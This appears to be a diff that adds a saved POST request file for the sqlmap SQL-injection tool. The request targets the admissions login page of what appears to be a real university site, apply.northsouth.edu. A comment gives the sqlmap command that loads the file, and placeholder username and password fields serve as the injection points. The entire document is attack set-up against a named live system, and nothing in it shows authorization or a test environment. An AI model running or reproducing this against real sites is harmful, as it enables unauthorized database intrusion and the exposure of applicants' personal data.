@@ -1,0 +1,3 @@
+http://apply.northsouth.edu:8080/admissionWeb/login.view (POST)  # .\sqlmap.py -r .\postReqs\nsuapply
+
+username=gfhfghfghfh&password=dfgdfgdfgdfg
